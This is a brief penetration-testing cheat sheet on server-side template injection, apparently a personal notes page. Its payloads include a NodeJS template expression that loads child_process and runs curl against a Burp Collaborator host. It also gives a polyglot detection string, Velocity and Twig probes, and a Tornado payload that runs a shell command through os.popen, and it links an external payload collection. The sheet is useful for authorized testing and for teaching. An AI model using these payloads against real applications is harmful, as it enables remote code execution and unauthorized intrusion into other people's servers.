# SSTI

```
- SSTI 
    - PHP 
    - NodeJS 
    - Java
    - Python
    - Ruby 
    - ASP
```

### payload

```
- #{function(){}()}
- #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 389rw78ngp6lsfdil25378nef5lx9m.burpcollaborator.net')}()}
```

### SSTI + XSS

```
- Detection -> Basic Payloads 
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
    - polyglot payload: <borna${7*7}{{7*7}}{7*7}#{7*7}{{7*'7'}}@(7*7)<%=7*7%>   
    - Velocity: #set($name = "borna") $name
        - https://velocity.apache.org/engine/1.7/user-guide.html
    - Twig: {{7*7}}, {{7*'7'}}
    - Tornado: <div data-gb-custom-block data-tag="import"></div>{{ os.popen("whoami").read() }}
```

### payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" %}
